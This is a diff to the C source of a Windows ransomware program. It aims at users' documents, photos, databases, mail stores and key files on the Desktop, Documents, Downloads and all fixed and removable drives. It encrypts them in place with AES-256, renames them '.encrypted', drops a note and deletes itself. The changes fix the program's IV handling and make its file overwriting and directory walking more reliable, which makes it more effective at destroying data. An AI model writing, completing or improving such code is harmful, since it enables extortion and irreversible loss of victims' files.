@@ -28,15 +28,15 @@
 #include <winsvc.h>
 
 /* 
- * CONFIGURATION & EXTENSIONS
+ * EXTENSIONS TO TARGET
  */
 static const char *g_ext[] = {
     ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
     ".pdf",".txt",".rtf",".csv",".tsv",
     ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
-    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
+    ".exe",".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
     ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso",
-    ".exe",".dll",".msi",".bat",".cmd",".ps1",".vbs",".js",
+    ".dll",".msi",".bat",".cmd",".ps1",".vbs",".js",
     ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
     ".pst",".ost",".eml",".msg",".mbox",
     ".key",".pem",".cer",".crt",".pfx",".p12",
@@ -58,127 +58,204 @@ static const char *g_ext[] = {
 /* 
  * CRYPTO ENGINE (AES-256 CBC with IV)
 */
-static HCRYPTPROV  g_hProv   = 0;
-static HCRYPTKEY   g_hAESKey = 0;
-static BYTE        g_iv[16];  // Initialization Vector
+#define AES_IV_SIZE      16
+#define AES_BLOCK_SIZE   16
+#define AES_PAD_HEADROOM (AES_BLOCK_SIZE * 2)
+#define ENC_EXT          ".encrypted"
+#define ENC_EXT_LEN      10
+#define MAX_FPATH        (MAX_PATH * 2)
+#define MAX_DEPTH        32
+ 
+/*  Directories to not TARGET*/
+static const char *g_skip[] = {
+    "\\Windows", "\\System32", "\\SysWOW64",
+    "\\Program Files", "\\Program Files (x86)",
+    "\\AppData", "\\$Recycle.Bin", "\\Boot",
+    "\\ProgramData\\Microsoft",
+    NULL
+};
+ 
+/* Context: replaces g_hProv + g_hAESKey + g_iv globals  */
+typedef struct {
+    HCRYPTPROV hProv;
+    HCRYPTKEY  hKey;
+} CRYPTO_CTX;
+ 
+/* ── Single global ctx (drop-in for original globals) ────────── */
+static CRYPTO_CTX g_ctx = {0, 0};
+ 
 
+ /*  InitCrypto
+ */
 static int InitCrypto(void) {
-    if(!CryptAcquireContextA(&g_hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+    if (!CryptAcquireContextA(&g_ctx.hProv, NULL, NULL,
+                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+        return 0;
+ 
+    if (!CryptGenKey(g_ctx.hProv, CALG_AES_256,
+                     CRYPT_EXPORTABLE, &g_ctx.hKey)) {
+        CryptReleaseContext(g_ctx.hProv, 0);
+        g_ctx.hProv = 0;
         return 0;
     }
-    // Generate a random key for this session
-    if(!CryptGenKey(g_hProv, CALG_AES_256, CRYPT_EXPORTABLE, &g_hAESKey)) {
-        CryptReleaseContext(g_hProv, 0);
-        return 0;
-    }
-    // Generate random IV
-    CryptGenRandom(g_hProv, 16, g_iv);
+    // No global IV — generated fresh per file inside DoEncryptFile
     return 1;
 }
+ 
+/*
+ *  CleanupCrypto
+  */
+static void CleanupCrypto(void) {
+    if (g_ctx.hKey)  { CryptDestroyKey(g_ctx.hKey);        g_ctx.hKey  = 0; }
+    if (g_ctx.hProv) { CryptReleaseContext(g_ctx.hProv, 0); g_ctx.hProv = 0; }
+}
+
+/* DoEncryptFile*/
 
 static void DoEncryptFile(const char *path) {
-    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if(hFile == INVALID_HANDLE_VALUE) return;
-
+    HANDLE hFile  = INVALID_HANDLE_VALUE;
+    HANDLE hWrite = INVALID_HANDLE_VALUE;
+    BYTE  *buf    = NULL;
+    DWORD  bufSize = 0;
+ 
+    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
+                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+ 
     DWORD fs = GetFileSize(hFile, NULL);
-    if(fs == INVALID_FILE_SIZE || fs < 1) { 
-        CloseHandle(hFile); 
-        return; 
-    }
-
-    // Allocate buffer for file content + IV prepended at start
-    DWORD bufSize = fs + 64; 
-    BYTE *buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if(!buf) { 
-        CloseHandle(hFile); 
-        return; 
-    }
-
-    // Read file content into buffer starting at offset 16 (leaving room for IV)
-    DWORD rd;
-    if(!ReadFile(hFile, buf + 16, fs, &rd, NULL)) { 
-        VirtualFree(buf, 0, MEM_RELEASE);
-        CloseHandle(hFile);
-        return;
-    }
-
-    // Prepare IV for encryption context
-    BYTE ivCopy[16];
-    memcpy(ivCopy, g_iv, 16);
-
-    // Encrypt data starting at offset 16
-    DWORD dataLen = rd;
-    // Note: CryptEncrypt modifies the length parameter to reflect encrypted size
-    if(!CryptEncrypt(g_hAESKey, 0, TRUE, 0, buf + 16, &dataLen, fs + 48)) {
-        VirtualFree(buf, 0, MEM_RELEASE);
-        CloseHandle(hFile);
-        return;
-    }
-
-    // Write IV to start of buffer (bytes 0-15)
-    memcpy(buf, ivCopy, 16);
-
-    // Overwrite original file with encrypted content
-    HANDLE hWrite = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if(hWrite != INVALID_HANDLE_VALUE) {
-        DWORD wr;
-        // Total size = IV (16 bytes) + Encrypted Data (dataLen)
-        WriteFile(hWrite, buf, dataLen + 16, &wr, NULL); 
-        CloseHandle(hWrite);
-    }
-
-    VirtualFree(buf, 0, MEM_RELEASE);
+    if (fs == INVALID_FILE_SIZE || fs < 1) goto cleanup;
+ 
+    // IV slot + plaintext + 2-block PKCS#7 headroom
+    bufSize = AES_IV_SIZE + fs + AES_PAD_HEADROOM;
+    buf = (BYTE *)VirtualAlloc(NULL, bufSize,
+                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) goto cleanup;
+ 
+    // Read plaintext into buf[AES_IV_SIZE..]
+    DWORD rd = 0;
+    if (!ReadFile(hFile, buf + AES_IV_SIZE, fs, &rd, NULL) || rd != fs)
+        goto cleanup;
+ 
     CloseHandle(hFile);
+    hFile = INVALID_HANDLE_VALUE;
+ 
+    // Generate fresh random IV for this file
+    BYTE iv[AES_IV_SIZE];
+    if (!CryptGenRandom(g_ctx.hProv, AES_IV_SIZE, iv)) goto cleanup;
+ 
+    // Apply IV to key object — THIS was missing in the original!
+    if (!CryptSetKeyParam(g_ctx.hKey, KP_IV, iv, 0)) goto cleanup;
+ 
+    // Encrypt in-place at buf[AES_IV_SIZE..]
+    DWORD encLen = rd;
+    if (!CryptEncrypt(g_ctx.hKey, 0, TRUE, 0,
+                      buf + AES_IV_SIZE, &encLen,
+                      fs + AES_PAD_HEADROOM))
+        goto cleanup;
+ 
+    // Prepend IV into buf[0..15]
+    memcpy(buf, iv, AES_IV_SIZE);
+ 
+    // Atomic write: temp file first, then rename over original
+    char tmpPath[MAX_FPATH];
+    snprintf(tmpPath, sizeof(tmpPath) - 1, "%s.tmp", path);
+ 
+    hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0,
+                         NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;
+ 
+    DWORD wr = 0;
+    DWORD totalOut = AES_IV_SIZE + encLen;
+    if (!WriteFile(hWrite, buf, totalOut, &wr, NULL) || wr != totalOut) {
+        CloseHandle(hWrite);
+        hWrite = INVALID_HANDLE_VALUE;
+        DeleteFileA(tmpPath);
+        goto cleanup;
+    }
+ 
+    CloseHandle(hWrite);
+    hWrite = INVALID_HANDLE_VALUE;
+ 
+    if (!MoveFileExA(tmpPath, path, MOVEFILE_REPLACE_EXISTING))
+        DeleteFileA(tmpPath);
+ 
+cleanup:
+    if (buf) {
+        SecureZeroMemory(buf, bufSize);   // wipe plaintext from memory
+        VirtualFree(buf, 0, MEM_RELEASE);
+    }
+    if (hFile  != INVALID_HANDLE_VALUE) CloseHandle(hFile);
+    if (hWrite != INVALID_HANDLE_VALUE) CloseHandle(hWrite);
 }
-
-static void EncryptDir(const char *dir) {
-    char path[MAX_PATH * 2];
-    snprintf(path, sizeof(path), "%s\\*", dir);
-
+ 
+/* 
+ *  ShouldSkipDir
+ **/
+static int ShouldSkipDir(const char *fullPath) {
+    for (int i = 0; g_skip[i]; i++) {
+        if (strstr(fullPath, g_skip[i])) return 1;
+    }
+    return 0;
+}
+ 
+/* 
+ *  EncryptDir  —  recursive directory walker
+ */
+static void EncryptDir(const char *dir, int depth) {
+    if (depth > MAX_DEPTH)   return;
+    if (ShouldSkipDir(dir))  return;
+ 
+    char pattern[MAX_FPATH];
+    snprintf(pattern, sizeof(pattern) - 1, "%s\\*", dir);
+ 
     WIN32_FIND_DATAA fd;
-    HANDLE hF = FindFirstFileA(path, &fd);
-    if(hF == INVALID_HANDLE_VALUE) return;
-
+    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+ 
     do {
-        if(!strcmp(fd.cFileName,".") || !strcmp(fd.cFileName,"..")) continue;
-
-        char full[MAX_PATH * 2];
-        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);
-
-        // Skip system folders to avoid BSOD or loops
-        if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            if(strstr(full,"\\Windows") || strstr(full,"\\System32") || 
-               strstr(full,"\\SysWOW64") || strstr(full,"\\Program Files") ||
-               strstr(full,"\\AppData")) continue;
-            EncryptDir(full); // Recursive
+        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
+            continue;
+ 
+        char full[MAX_FPATH];
+        int written = snprintf(full, sizeof(full) - 1,
+                               "%s\\%s", dir, fd.cFileName);
+        if (written < 0 || written >= (int)(sizeof(full) - 1))
+            continue;  // path too long, skip safely
+ 
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            EncryptDir(full, depth + 1);
         } else {
-            // Check extension
+            // Skip if already has .encrypted suffix
+            size_t flen = strlen(full);
+            if (flen > ENC_EXT_LEN &&
+                _stricmp(full + flen - ENC_EXT_LEN, ENC_EXT) == 0)
+                continue;
+ 
+            // Check extension whitelist
             const char *ext = strrchr(full, '.');
-            if(ext) {
-                int match = 0;
-                for(int i=0; g_ext[i]; i++) {
-                    if(_stricmp(ext, g_ext[i]) == 0) {
-                        match = 1;
-                        break;
-                    }
-                }
-                if(match) {
-                    // Check if already encrypted to prevent double encryption
-                    char newp[MAX_PATH * 2];
-                    snprintf(newp, sizeof(newp), "%s.encrypted", full);
-                    if(GetFileAttributesA(full) != INVALID_FILE_ATTRIBUTES && 
-                       GetFileAttributesA(newp) == INVALID_FILE_ATTRIBUTES) {
-                        DoEncryptFile(full); // Use renamed function here
-                        // Rename to .encrypted to mark as done
-                        MoveFileExA(full, newp, MOVEFILE_REPLACE_EXISTING);
-                    }
-                }
+            if (!ext) continue;
+ 
+            int match = 0;
+            for (int i = 0; g_ext[i]; i++) {
+                if (_stricmp(ext, g_ext[i]) == 0) { match = 1; break; }
             }
+            if (!match) continue;
+ 
+            // Guard: skip if .encrypted counterpart already exists
+            char encPath[MAX_FPATH];
+            snprintf(encPath, sizeof(encPath) - 1, "%s%s", full, ENC_EXT);
+            if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
+                continue;
+ 
+            // Encrypt then rename
+            DoEncryptFile(full);
+            MoveFileExA(full, encPath, MOVEFILE_REPLACE_EXISTING);
         }
-    } while(FindNextFileA(hF, &fd));
-    FindClose(hF);
+    } while (FindNextFileA(hFind, &fd));
+ 
+    FindClose(hFind);
 }
-
+ 
 /* 
  * DIRECT API EXECUTION
 */
@@ -311,17 +388,17 @@ static unsigned __stdcall Worker(void *arg) {
     char buf[MAX_PATH];
     
     // Encrypt User Folders
-    if(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf)==S_OK)       EncryptDir(buf);
-    if(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, buf)==S_OK)   EncryptDir(buf);
+    if(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf)==S_OK)       EncryptDir(buf, 0);
+    if(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, buf)==S_OK)   EncryptDir(buf, 0);
     // CSIDL_DOWNLOADS is 0x0015
-    if(SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf)==S_OK)             EncryptDir(buf);
+    if(SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf)==S_OK)             EncryptDir(buf, 0);
     
     // Encrypt Drives
     for(char d='C'; d<='Z'; d++) {
         char root[4] = {d,':','\\',0};
         UINT dt = GetDriveTypeA(root);
         if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
-            EncryptDir(root);
+            EncryptDir(root, 0);
         }
     }
     return 0;
@@ -389,9 +466,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     DropNoteDirect();
 
     // Cleanup Crypto
-    CryptDestroyKey(g_hAESKey);
-    CryptReleaseContext(g_hProv, 0);
-    
+
+    CleanupCrypto();
+
     // Self Delete (Robust)
     char exeP[MAX_PATH];
     GetModuleFileNameA(NULL, exeP, MAX_PATH);
@@ -407,3 +484,5 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     CloseHandle(hMutex);
     return 0;
 }
+
+
